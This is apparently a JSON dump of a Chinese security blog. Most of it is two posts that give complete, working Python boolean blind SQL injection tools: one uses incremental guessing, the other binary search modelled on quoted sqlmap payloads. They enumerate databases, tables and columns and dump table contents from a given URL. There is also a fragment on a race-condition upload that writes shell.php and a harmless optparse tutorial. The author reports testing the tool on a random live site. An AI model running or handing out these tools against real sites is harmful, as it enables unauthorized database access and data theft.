可以看到通过多进程同时上传时可以成功在文件删除之前访问到该文件在服务器目录下可以看到成功写入shell.php","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://yoursite.com/tags/文件上传/"}]},{"title":"python布尔盲注脚本算法完善","slug":"pyblindsqlimax","date":"2018-06-06T02:11:33.645Z","updated":"2018-06-06T12:51:03.295Z","comments":true,"path":"2018/06/06/pyblindsqlimax/","link":"","permalink":"http://yoursite.com/2018/06/06/pyblindsqlimax/","excerpt":"python布尔盲注脚本算法完善完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找0-126这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在0-126这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~","text":"python布尔盲注脚本算法完善完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找0-126这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在0-126这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~ 分析sqlmap判断时的payload首先看一下sqlmap在判断数据库个数时的payload [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;54 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;52 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;53 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;48 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;9 AND &apos;rTJT&apos;=&apos;rTJT [12:09:16] [INFO] retrieved: 5 通过分析payload可以看出sqlmap将count查到的数据库个数使用cast转换为了字符型，然后指定二分法的范围为字符&#39;0&#39;-&#39;9&#39;，其ascii码转换为十进制也就是48-57，这个区域中间值为52，而看上面sqlmap在判断数据库个数时的第一个payload比较的值是51，所以可以确定sqlmap指定的二分法的大致范围确实是48-57(‘0’-‘9’) 通过对sqlmap的payload的分析，我想到了一种解决之前那个问题的办法，由于查询个数、长度、记录数的结果一定为数字，那么不管这个数字有多大，只要转换为字符串后，它的每一位一定是在&#39;0&#39;-&#39;9&#39;这个范围内，也就是十进制的48-57，所以只需要把数字转换成字符串，然后去使用二分法，指定二分法的范围为48-57，之后通过二分法可以判断出数字字符串每一位的字符，直到不能判断为止，最终就能得到这个数字 自增查找和二分查找算法对比和之前的自增查找做一个对比，首先以猜解数据库个数为例，我的数据库个数为5个 在不确定二分法范围时采用的自增算法代码 12345678910111213import requestsurl=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1\"basehtml=requests.get(url=url).contenti=0while 1: payload=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select count(schema_name) from information_schema.schemata)=%d-- \"%(i) html=requests.get(url=payload).content print payload if basehtml==html: print i break else: i=i+1 自增算法发送了5次payload判断出了数据库个数为5 再看一下刚刚说的二分查找算法代码 12345678910111213141516171819202122232425import requestsurl=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1\"basehtml=requests.get(url=url).contenti=1s=\"\"while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- \"%(i,mid) print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: breakprint s 在这里二分算法发送了6次payload才判断出来了数据库的个数为5，可以看出当数字比较小的时候，上面的二分法的优势并没有体现出来 那么再举一个例子，比如用盲注判断information_schema这个数据库名的长度，长度为18，相比之前的5大了一些，为2位数，再次对比一下两个算法 在不确定二分法范围时采用的自增算法代码 12345678910111213import requestsurl=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1\"basehtml=requests.get(url=url).contenti=0while 1: payload=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select length(schema_name) from information_schema.schemata limit 0,1)=%d-- \"%(i) html=requests.get(url=payload).content print payload if basehtml==html: print i break else: i=i+1 发送了18次payload才判断出information_schema数据库名的长度为18 再看一下刚刚说的二分查找算法代码 12345678910111213141516171819202122232425import requestsurl=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1\"basehtml=requests.get(url=url).contenti=1s=\"\"while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit 0,1),%d,1))&gt;%d-- \"%(i,mid) print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: breakprint s 可以看到随着数字的增加，二分法的优势体现出来了，只发送了9次payload就判断出了information_schema数据库名的长度为18 盲注脚本加强版修改过后的盲注脚本，注入速度相比之前的那个明显有所提高 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333#coding=utf-8import requestsimport sysfrom optparse import OptionParserdef getdbnum(url,basehtml): i=1 s=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- \"%(url,i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: break return int(s)def getdbs(url,basehtml,num): #print \"num:%s\"%(num) for n in range(num): i=1 length=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1),%d,1))&gt;%d-- \"%(url,n,i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: length=length+chr((low+high+1)/2) i=i+1 else: break s=\"\" #print \"len:%s\"%(length) for c in range(1,int(length)+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- \"%(url,str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print sdef gettablenum(url,basehtml,dbname): i=1 s=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- \"%(url,dbname.encode(\"hex\"),i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: break return int(s) def gettables(url,basehtml,num,dbname): print \"num:%s\"%(num) for n in range(num): i=1 length=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(length(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- \"%(url,dbname.encode(\"hex\"),n,i,mid) print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: length=length+chr((low+high+1)/2) i=i+1 else: break s=\"\" for c in range(1,int(length)+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- \"%(url,dbname.encode(\"hex\"),str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print sdef getcolumnnum(url,basehtml,tablename,dbname): i=1 s=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: break return int(s) def getcolumns(url,basehtml,num,tablename,dbname): #print \"num:%s\"%(num) for n in range(num): i=1 length=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(length(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),n,i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: length=length+chr((low+high+1)/2) i=i+1 else: break s=\"\" for c in range(1,int(length)+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print sdef getdatanum(url,basehtml,tablename,dbname): i=1 s=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),%d,1))&gt;%d-- \"%(url,dbname,tablename,i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: s=s+chr((low+high+1)/2) i=i+1 else: break return int(s) def dumpdatas(url,basehtml,num,columnname,tablename,dbname): #print \"num:%s\"%(num) for n in range(num): i=1 length=\"\" while 1: count=0 low=48 high=57 while low&lt;=high: mid=(low+high)/2 payload=\"%s AND ORD(MID((SELECT IFNULL(CAST(length(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),%d,1))&gt;%d-- \"%(url,columnname,dbname,tablename,n,i,mid) #print payload html=requests.get(url=payload).content if basehtml==html: low=mid+1 count+=1 else: high=mid-1 if count!=0: length=length+chr((low+high+1)/2) i=i+1 else: break s=\"\" for c in range(1,int(length)+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- \"%(url,columnname,dbname,tablename,str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print sdef testurl(url,basehtml): url1=\"%s'\"%(url) url2='%s\"'%(url) html1=requests.get(url1).content html2=requests.get(url2).content if basehtml!=html1 and basehtml!=html2: #print \"this url maybe injectable,type numeric\" return url elif basehtml!=html1 and basehtml==html2: #print \"this url maybe injectable,type string(\\\")\" return url1 elif basehtml==html1 and basehtml!=html2: #print \"this url maybe injectable,type string(\\\")\" return url2 else: return Falsedef main(): parser=OptionParser() parser.add_option(\"-u\",type=\"string\",dest=\"url\",help=\"-u url\") parser.add_option(\"-C\",type=\"string\",dest=\"column\",help=\"-C column1,column2,...,...\") parser.add_option(\"-T\",type=\"string\",dest=\"table\",help=\"-T table\") parser.add_option(\"-D\",type=\"string\",dest=\"db\",help=\"-D dadabase\") parser.add_option(\"--dbs\",action=\"store_true\",dest=\"dbs\",help=\"inject all databases\") parser.add_option(\"--dump\",action=\"store_true\",dest=\"dump\",help=\"dump columns with selected table and database\") parser.add_option(\"--tables\",action=\"store_true\",dest=\"tables\",help=\"inject all tables in selected database\") parser.add_option(\"--columns\",action=\"store_true\",dest=\"columns\",help=\"inject all columns in selected table and database\") (options,args)=parser.parse_args() if options.url and len(sys.argv)==3: url=options.url basehtml=requests.get(url=url).content result=testurl(url,basehtml) if result: print \"this url maybe injectable\" else: print \"this url maybe notinjectable\" elif options.url and options.dbs:#--dbs url=options.url basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getdbnum(url,basehtml) getdbs(url,basehtml,num) elif options.url and options.tables and options.db:#-u url --tables -D database url=options.url db=options.db basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=gettablenum(url,basehtml,db) gettables(url,basehtml,num,db) elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database url=options.url table=options.table db=options.db basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getcolumnnum(url,basehtml,table,db) getcolumns(url,basehtml,num,table,db) elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump -C column -T table -D database url=options.url column=options.column table=options.table db=options.db columns=column.split(\",\") basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getdatanum(url,basehtml,table,db) for column in columns: dumpdatas(url,basehtml,num,column,table,db) else: #print \"Please look this script help information,to use --help or -h\" parser.print_help()if __name__=='__main__': main()","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python编程实现自动化注入之布尔盲注","slug":"pyblindsqli","date":"2018-06-04T17:22:39.311Z","updated":"2018-06-06T12:49:43.416Z","comments":true,"path":"2018/06/05/pyblindsqli/","link":"","permalink":"http://yoursite.com/2018/06/05/pyblindsqli/","excerpt":"python编程实现自动化注入之布尔盲注python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧","text":"python编程实现自动化注入之布尔盲注python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧 布尔盲注布尔盲注这种注入手法主要用于页面没有回显位置而且没有报错信息的情况下，这时可以构造逻辑判断，通过页面返回的不同去判断逻辑的真假从而猜取数据库的字符 所以可以通过python脚本循环猜解出数据库中的内容，二分法猜解字符会比一次次循环累加要快很多，主要的思路就是先用requests请求一个正常的页面，当然这个页面是存在sql注入的，然后通过requests请求加上单双引号的url所返回的页面，通过和正常页面对比来判断为数字型注入还是字符型注入，判断的方法 url参数后加单引号与双引号均报错，则为数字型注入 url参数后加单引号报错双引号不报错，为字符型注入且参数外为单引号 url参数后加单引号不报错双引号报错，为字符型注入且参数外为双引号 接着就是根据页面的不同判断数据库的个数和每个数据库名的长度，然后通过二分法指定范围(0-126)判断出来每个数据库的名字，然后采取相同的方法判断出来指定数据库下的表名，指定数据库表名下的字段名以及数据库里的数据 为了更方便的理解使用，我用python写了一个盲注二分法算法模型 模型1:1234567891011121314def binary_search(num): low=0 high=126 while low&lt;=high: print \"search zone:(%d-%d)\"%(low,high) mid=(low+high)/2 if mid&lt;num: low=mid+1 else: high=mid-1 return (low+high+1)/2num=input(\"please input a number(1~126):\")result=binary_search(num)print result 模型2:1234567891011121314def binary_search(num): low=0 high=126 while low&lt;=high: print \"search zone:(%d-%d)\"%(low,high) mid=(low+high)/2 if mid&gt;num: high=mid-1 else: low=mid+1 return (low+high-1)/2num=input(\"please input a number(1~126):\")result=binary_search(num)print result有了模型，有相当于有了一个轮子，通过模型可以更容易地编写出自己的盲注脚本，贴出我编写的盲注脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#coding=utf-8import requestsimport sysfrom optparse import OptionParserdef getdbnum(url,basehtml): num=0 while 1: payload=\"%s and (select count(*) from information_schema.schemata)=%s-- \"%(url,str(num)) #print payload html=requests.get(url=payload).content #print html if html==basehtml: return num else: num=num+1def getdbs(url,basehtml,num): for n in range(num): length=0 while 1: payload=\"%s and (select length(schema_name) from information_schema.schemata limit %s,1)=%s-- \"%(url,str(n),str(length)) #print payload html=requests.get(url=payload).content if html==basehtml: s=\"\" #print length for c in range(1,length+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- \"%(url,str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print s break else: length=length+1def gettablenum(url,basehtml,dbname): num=0 while 1: payload=\"%s and (select count(*) from information_schema.tables where table_schema=0x%s)=%s-- \"%(url,dbname.encode(\"hex\"),str(num)) #print payload html=requests.get(url=payload).content if html==basehtml: return num else: num=num+1 def gettables(url,basehtml,num,dbname): for n in range(num): length=0 while 1: payload=\"%s and (select length(table_name) from information_schema.tables where table_schema=0x%s limit %s,1)=%s-- \"%(url,dbname.encode(\"hex\"),str(n),str(length)) #print payload html=requests.get(url=payload).content if html==basehtml: #print length s=\"\" for c in range(1,length+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- \"%(url,dbname.encode(\"hex\"),str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print s break else: length=length+1def getcolumnnum(url,basehtml,tablename,dbname): num=0 while 1: payload=\"%s and (select count(*) from information_schema.columns where table_name=0x%s and table_schema=0x%s)=%s-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),str(num)) #print payload html=requests.get(url=payload).content if html==basehtml: return num else: num=num+1def getcolumns(url,basehtml,num,tablename,dbname): for n in range(num): length=0 while 1: payload=\"%s and (select length(column_name) from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1)=%s-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),str(n),str(length)) #print payload html=requests.get(url=payload).content if html==basehtml: #print length s=\"\" for c in range(1,length+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- \"%(url,tablename.encode(\"hex\"),dbname.encode(\"hex\"),str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print s break else: length=length+1def getdatanum(url,basehtml,tablename,dbname): num=0 while 1: payload=\"%s and (select count(*) from %s.%s)=%s-- \"%(url,dbname,tablename,str(num)) #print payload html=requests.get(url=payload).content if html==basehtml: return num else: num=num+1 def dumpdatas(url,basehtml,num,columnname,tablename,dbname): for n in range(num): length=0 while 1: payload=\"%s and (select length(%s) from %s.%s limit %s,1)=%s-- \"%(url,columnname,dbname,tablename,str(n),str(length)) #print payload html=requests.get(url=payload).content if html==basehtml: #print length s=\"\" for c in range(1,length+1): low=0 high=126 while low&lt;=high: mid=(low+high)/2 payload=\"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- \"%(url,columnname,dbname,tablename,str(n),str(c),str(mid)) html=requests.get(url=payload).content #print payload if html==basehtml: #print payload low=mid+1 else: high=mid-1 s=s+chr((low+high+1)/2) print s break else: length=length+1def testurl(url,basehtml): url1=\"%s'\"%(url) url2='%s\"'%(url) html1=requests.get(url1).content html2=requests.get(url2).content if basehtml!=html1 and basehtml!=html2: #print \"this url maybe injectable,type numeric\" return url elif basehtml!=html1 and basehtml==html2: #print \"this url maybe injectable,type string(\\\")\" return url1 elif basehtml==html1 and basehtml!=html2: #print \"this url maybe injectable,type string(\\\")\" return url2 else: return Falsedef main(): parser=OptionParser() parser.add_option(\"-u\",type=\"string\",dest=\"url\",help=\"-u url\") parser.add_option(\"-C\",type=\"string\",dest=\"column\",help=\"-C column1,column2,...,...\") parser.add_option(\"-T\",type=\"string\",dest=\"table\",help=\"-T table\") parser.add_option(\"-D\",type=\"string\",dest=\"db\",help=\"-D dadabase\") parser.add_option(\"--dbs\",action=\"store_true\",dest=\"dbs\",help=\"inject all databases\") parser.add_option(\"--dump\",action=\"store_true\",dest=\"dump\",help=\"dump columns with selected table and database\") parser.add_option(\"--tables\",action=\"store_true\",dest=\"tables\",help=\"inject all tables in selected database\") parser.add_option(\"--columns\",action=\"store_true\",dest=\"columns\",help=\"inject all columns in selected table and database\") (options,args)=parser.parse_args() if options.url and len(sys.argv)==3: url=options.url basehtml=requests.get(url=url).content result=testurl(url,basehtml) if result: print \"this url maybe injectable\" else: print \"this url maybe notinjectable\" elif options.url and options.dbs:#--dbs url=options.url basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getdbnum(url,basehtml) getdbs(url,basehtml,num) elif options.url and options.tables and options.db:#-u url --tables -D database url=options.url db=options.db basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=gettablenum(url,basehtml,db) gettables(url,basehtml,num,db) elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database url=options.url table=options.table db=options.db basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getcolumnnum(url,basehtml,table,db) getcolumns(url,basehtml,num,table,db) elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump -C column -T table -D database url=options.url column=options.column table=options.table db=options.db columns=column.split(\",\") basehtml=requests.get(url=url).content url=testurl(url,basehtml) num=getdatanum(url,basehtml,table,db) for column in columns: dumpdatas(url,basehtml,num,column,table,db) else: #print \"Please look this script help information,to use --help or -h\" parser.print_help()if __name__=='__main__': main() 使用方法，自己使用optparse库将脚本参数设置成了类似于sqlmap的参数，下面是该脚本使用方法随便测试网上一个注入点来测试写的工具是否可以使用，可以看到成功注入出来了数据库，当然经过测试也能注入出表字段和数据库内容，这个工具只是初步完成了，当然还有很多的不足，这些都需要自己不断的去完善","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python optparse模块使用总结","slug":"pyoptparse","date":"2018-06-04T16:08:28.330Z","updated":"2018-06-04T17:13:29.845Z","comments":true,"path":"2018/06/05/pyoptparse/","link":"","permalink":"http://yoursite.com/2018/06/05/pyoptparse/","excerpt":"python optparse模块使用总结之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节","text":"python optparse模块使用总结之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节 使用首先需要导入optparse模块中的OptionParser类，这个类里面有设置和解析命令行参数的方法，然后创建它的一个实例 from optparse import OptionParser parser = OptionParser() 调用该类的add_option方法设置命令行参数 parser.add_option(&quot;-自定义的参数识别标签&quot;,&quot;--自定义的参数识别标签&quot;,action=&quot;store/store_true/store_false&quot;,type=&quot;string/...&quot;,dest=&quot;&quot; help=&quot;&quot;) 该函数里面比较重要的几个参数的用法 首先是第一和第二个参数作为调用时的参数的标签，会被识别 action参数： action参数告诉optparse当它在命令行中遇到选项时该做什么。action有三种存储方式：store、store_false、store_true。如果不指定action的值，默认的是store，store需要在命令行中，标签后跟上参数，并将该命令行参数的值赋值给dest参数中指定的变量。如果action值为store_true，那么在命令行中，参数的标签后不需要跟参数，如果命令行中使用了该参数标签，那么该命令行参数的dest变量的值会为True，store_flase同样不需要指定参数，不过不同的是，指定为store_false的参数标签，其dest的值在标签设置时会被设为False type参数 type指定dest参数中设置的变量的存储类型，默认为string dest参数 里面的值为变量名，当action被设置为store时，该变量用户接受参数标签后的参数值 help参数 设置要显示的参数的帮助信息 设置完命令行参数后需要解析命令行参数，使用该类的parse_args方法 (options, args) = parser.parse_args() 该方法会返回两个对象，options为字典类型，里面存放了dest中设置的变量和其对应的命令行参数值，args为列表类型，里面存放多余的命令行参数，一个参数标签后只能跟一个参数，多余的会被存在args中 在python中使用命令行中的参数，解析完了命令行参数，就可以在python中直接调用了，调用方法 options.dest中设置的变量名 通过这种方式就能取到命令行中的参数值了 实例为了更深的理解，给出几个实例 实例1.action的值为store默认值： &gt;&gt;&gt; from optparse import OptionParser &gt;&gt;&gt; parser=OptionParser() &gt;&gt;&gt; parser.add_option(&quot;-u&quot;,&quot;--url&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;-u/--url url&quot;) &lt;Option at 0x268ce88: -u/--url&gt; &gt;&gt;&gt; args=[&quot;-h&quot;] &gt;&gt;&gt; (options,args)=parser.parse_args(args) Usage: [options] Options: -h, --help show this help message and exit -u URL, --url=URL -u/--url url &gt;&gt;&gt; args=[&quot;-u&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;] &gt;&gt;&gt; (options,args)=parser.parse_args(args) &gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args) {&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;] &gt;&gt;&gt; print options.url &gt;&gt;&gt; inputurl1 &gt;&gt;&gt; args=[&quot;--url&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;] &gt;&gt;&gt; (options,args)=parser.parse_args(args) &gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args) {&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;] &gt;&gt;&gt; args=[] &gt;&gt;&gt; 